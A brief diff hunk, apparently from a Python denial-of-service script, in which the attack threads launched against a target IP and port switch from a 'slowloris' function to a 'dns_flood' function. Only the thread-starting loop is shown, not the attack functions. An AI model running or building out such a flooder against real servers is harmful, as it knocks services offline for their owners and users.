@@ -124,7 +124,7 @@ if __name__ == "__main__":
 
             # Threads starten
             attack_threads = [
-                threading.Thread(target=slowloris, args=(ip, port))
+                threading.Thread(target=dns_flood, args=(ip, port))
                 for _ in range(threads)
             ]
             for thread in attack_threads:
